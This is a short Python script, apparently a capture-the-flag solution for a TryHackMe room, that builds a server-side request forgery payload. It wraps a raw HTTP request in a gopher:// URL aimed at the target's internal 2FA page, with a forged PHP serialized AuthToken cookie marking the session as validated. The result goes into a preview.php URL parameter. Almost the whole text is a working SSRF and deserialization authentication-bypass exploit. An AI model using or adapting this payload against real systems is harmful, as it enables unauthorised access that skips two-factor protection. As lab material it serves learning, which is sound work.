# script provided by 0day https://x.com/0dayCTF
# userd on tryhackme room https://tryhackme.com/room/extract
# youtube video walk through: https://youtu.be/fM9EisT6s54

python3 - <<'PY'
import urllib.parse, sys
req = (
  "GET /management/2fa.php HTTP/1.1\r\n"
  "Host: 127.0.0.1\r\n"
  "Cookie: PHPSESSID=vgf25sat82nh5lvqrpqierok3h; auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3
A%22validated%22%3Bb%3A1%3B%7D\r\n"
  "Connection: close\r\n"
  "\r\n"
)
u = "gopher://127.0.0.1:80/_" + urllib.parse.quote(req, safe='')
print("http://10.10.172.66/preview.php?url=" + urllib.parse.quote(u, safe=''))
PY
